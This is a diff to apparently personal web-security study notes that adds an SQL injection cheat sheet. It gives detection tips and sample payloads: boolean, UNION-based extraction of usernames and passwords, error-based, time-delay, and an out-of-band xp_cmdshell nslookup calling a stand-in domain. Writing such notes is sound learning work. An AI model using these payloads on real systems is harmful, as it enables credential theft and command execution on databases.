@@ -9,6 +9,7 @@
 # Table of Contents
 **Server-side topics (13)**
 - [SQL Injection](#sql-injection)
+  - [Lab](#lab)
 - [Path Traversal](#path-traversal)
 - [Authentication](#authentication)
 - [Business Logic Vulnerabilities](#business-logic-vulnerabilities)
@@ -43,7 +44,27 @@
 - [Essential Skills](#essential-skills)
   
 ## SQL Injection
-Content for SQL Injection...
+**How to detect**     
+- single quote ' and look for errors or other anomalies
+- Boolean condition `OR 1=1` and `OR 1=2`
+- time delays
+
+**Basic SQL**  
+- ' OR 1=1 --
+
+**Union-Based Injection**  
+- ' UNION SELECT 1, username, password FROM users -
+
+**Error-Based Injection**  
+- '; SELECT 1/0 --
+
+**Time-Base Injection**  
+- '; WAITFOR DELAY '0:0:10' --
+
+**Out-of-Band (OOB) Injection**  
+- '; EXEC xp_cmdshell('nslookup yourdomain.com') --
+
+### Lab
 
 ## Path Traversal
 Content for Path Traversal...
